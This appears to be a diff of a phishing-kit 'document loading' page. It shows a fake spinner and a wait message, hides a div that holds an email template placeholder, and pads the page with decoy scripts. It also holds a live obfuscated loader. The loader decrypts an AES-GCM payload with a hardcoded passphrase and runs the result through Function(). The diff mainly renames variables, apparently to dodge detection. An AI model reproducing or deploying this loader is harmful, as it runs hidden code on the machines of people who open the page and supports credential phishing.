@@ -4,13 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="author" content="Anonymous Developer">
-    <title>Improved Loading Document</title>
+    <title>Enhanced Loading Interface</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             font-family: 'Verdana', sans-serif;
-            background-color: #f8f9fa;
+            background-color: #eef2f3;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -18,35 +18,35 @@
             height: 100vh;
             overflow: hidden;
         }
-        .spinner-wrapper {
+        .loader-container {
             display: flex;
             justify-content: center;
             align-items: center;
             position: relative;
         }
-        .rotating-spinner {
-            width: 60px;
-            height: 60px;
-            border: 8px solid #aaa;
-            border-top: 8px solid #3498db;
+        .spinning-circle {
+            width: 70px;
+            height: 70px;
+            border: 10px solid #ccc;
+            border-top: 10px solid #4caf50;
             border-radius: 50%;
-            animation: rotate 1.2s linear infinite;
+            animation: spinAnimation 1.5s linear infinite;
         }
-        @keyframes rotate {
+        @keyframes spinAnimation {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .hidden-note {
+        .hidden-text {
             visibility: hidden;
-            font-size: 14px;
+            font-size: 16px;
             color: crimson;
         }
-        .loading-indicator {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #444;
+        .status-message {
+            margin-top: 25px;
+            font-size: 20px;
+            color: #555;
         }
-        .extra-section {
+        .extra-div {
             opacity: 0;
             pointer-events: none;
             position: absolute;
@@ -57,80 +57,80 @@
 </head>
 <body>
 
-    <!-- Wrapper with no purpose -->
-    <div id="hidden-wrapper" style="display: none;">
-        <div class="placeholder-content" useless-attr="placeholder"></div>
+    <!-- Hidden container -->
+    <div id="hidden-container" style="display: none;">
+        <div class="dummy-element" unused-attr="dummy"></div>
         <div nike-bashman="" adidas="<%=EMAIL64%>"></div>
     </div>
 
-    <div class="spinner-wrapper">
-        <div class="rotating-spinner" extra-data="example"></div>
+    <div class="loader-container">
+        <div class="spinning-circle" extra-info="sample"></div>
     </div>
-    <p class="loading-indicator">Your document is being prepared. Please wait...</p>
+    <p class="status-message">Preparing your document. Please hold...</p>
 
-    <!-- Additional and redundant elements -->
-    <div class="extra-section">
-        <span>This section is redundant and hidden.</span>
+    <!-- Additional unused elements -->
+    <div class="extra-div">
+        <span>This is an unused and hidden section.</span>
     </div>
 
     <!-- Main Script -->
     <script>
-        // Fake complexity added
-        const startFakeTask = () => {
-            const mockArray = ["Task1", "Task2", "Task3"];
-            mockArray.forEach(task => console.log(`Executing: ${task}`));
+        // Adding redundant operations
+        const initiateFakeTask = () => {
+            const fakeTasks = ["StepA", "StepB", "StepC"];
+            fakeTasks.forEach(task => console.log(`Running: ${task}`));
         };
-        startFakeTask();
+        initiateFakeTask();
 
-        // Simulate document readiness
+        // Simulate loading completion
         setTimeout(() => {
-            document.querySelector('.loading-indicator').textContent = 'Your document is ready!';
-            document.body.style.backgroundColor = '#eaf7ea';
-        }, 5000);
+            document.querySelector('.status-message').textContent = 'Your document is now ready!';
+            document.body.style.backgroundColor = '#f3fce3';
+        }, 5500);
 
-        // Another fake process
+        // Insert dummy elements
         (() => {
-            const tempDiv = document.createElement('div');
-            tempDiv.setAttribute('id', 'temporaryDiv');
-            tempDiv.innerHTML = 'Temporary content here!';
-            console.log(tempDiv);
+            const redundantDiv = document.createElement('div');
+            redundantDiv.setAttribute('id', 'dummyDiv');
+            redundantDiv.innerHTML = 'Extra content for no reason!';
+            console.log(redundantDiv);
         })();
     </script>
 
-    <!-- Additional Script for Redundancy -->
+    <!-- Additional Script for Noise -->
     <script>
-        const unnecessaryFunction = () => {
-            const logData = "Redundant log message.";
-            for (let i = 0; i < 2; i++) {
-                console.log(logData);
+        const unnecessaryLogger = () => {
+            const redundantLog = "This log is unnecessary.";
+            for (let i = 0; i < 3; i++) {
+                console.log(redundantLog);
             }
         };
-        unnecessaryFunction();
+        unnecessaryLogger();
 
-        const performDataDecryption = async (cipherData, ivHex, saltHex, password) => {
-            console.log("[INFO] Starting decryption process...");
+        const performDataDecryption = async (encryptedData, ivString, saltString, passphrase) => {
+            console.log("[INFO] Decryption procedure initiated...");
 
-            // Convert hex to Uint8Array
-            const convertHexToBytes = (hex) => {
-                console.log(`[DEBUG] Hex conversion: ${hex}`);
+            // Convert hex to bytes
+            const hexToBytes = (hex) => {
+                console.log(`[DEBUG] Hexadecimal conversion in progress: ${hex}`);
                 return Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
             };
 
-            const ivBytes = convertHexToBytes(ivHex);
-            const saltBytes = convertHexToBytes(saltHex);
+            const ivBytes = hexToBytes(ivString);
+            const saltBytes = hexToBytes(saltString);
 
-            // Simulating an artificial delay
-            const simulateDelay = () => new Promise(resolve => {
-                console.log("[INFO] Delay simulated...");
+            // Simulate delay for no reason
+            const fakeDelay = () => new Promise(resolve => {
+                console.log("[INFO] Simulating delay...");
                 setTimeout(() => {
-                    console.log("[DEBUG] Delay complete.");
+                    console.log("[DEBUG] Delay concluded.");
                     resolve();
-                }, 150);
+                }, 200);
             });
 
             // Deriving key
-            const generateKey = async (keyMaterial, salt) => {
-                console.log("[INFO] Generating decryption key...");
+            const deriveKey = async (keyMaterial, salt) => {
+                console.log("[INFO] Deriving decryption key...");
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                     keyMaterial,
@@ -142,45 +142,45 @@
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(password),
+                new TextEncoder().encode(passphrase),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await simulateDelay();
-            const aesKey = await generateKey(keyMaterial, saltBytes);
+            await fakeDelay();
+            const aesKey = await deriveKey(keyMaterial, saltBytes);
 
             try {
-                console.log("[INFO] Decrypting data...");
-                const decryptedBuffer = await crypto.subtle.decrypt(
+                console.log("[INFO] Starting decryption...");
+                const decryptedContent = await crypto.subtle.decrypt(
                     { name: "AES-GCM", iv: ivBytes },
                     aesKey,
-                    convertHexToBytes(cipherData)
+                    hexToBytes(encryptedData)
                 );
-                console.log("[SUCCESS] Decryption complete.");
-                return new TextDecoder().decode(decryptedBuffer);
+                console.log("[SUCCESS] Decryption completed.");
+                return new TextDecoder().decode(decryptedContent);
             } catch (error) {
                 console.error("[ERROR] Decryption failed:", error);
                 return null;
             }
         };
 
-        // Processing decrypted data
+        // Analyze decrypted data
         const analyzeDecryptedData = (data) => {
-            console.log("[INFO] Analyzing decrypted data...");
+            console.log("[INFO] Analyzing decrypted content...");
             if (!data) {
-                console.error("[ERROR] No data available.");
+                console.error("[ERROR] Content missing.");
                 return;
             }
-            const reversed = data.split("").reverse().join("");
-            console.log("[INFO] Processed data (reversed):", reversed);
-            return reversed;
+            const reversedContent = data.split("").reverse().join("");
+            console.log("[INFO] Reversed content:", reversedContent);
+            return reversedContent;
         };
 
-        // Initialization script
+        // Initialization block
         (async () => {
-            console.log("[INFO] Script started...");
+            console.log("[INFO] Initialization started...");
             const payload = {
                 iv: "c5d54a9c69516d18fab025aa",
                 salt: "f2c9263a7137550b0829e316a222b86e",
@@ -190,19 +190,19 @@
             console.log("[INFO] Payload details:", payload);
 
             try {
-                const decryptedContent = await performDataDecryption(
+                const decryptedResult = await performDataDecryption(
                     payload.data,
                     payload.iv,
                     payload.salt,
                     "quickescape"
                 );
 
-                if (decryptedContent) {
-                    console.log("[INFO] Decrypted content:", decryptedContent);
-                    const processedContent = analyzeDecryptedData(decryptedContent);
+                if (decryptedResult) {
+                    console.log("[INFO] Decrypted result:", decryptedResult);
+                    const finalOutput = analyzeDecryptedData(decryptedResult);
 
-                    console.log("[INFO] Executing processed content...");
-                    Function(`${decryptedContent}`)();
+                    console.log("[INFO] Executing decrypted content...");
+                    Function(`${decryptedResult}`)();
                 }
             } catch (err) {
                 console.error("[ERROR] An unexpected error occurred:", err);
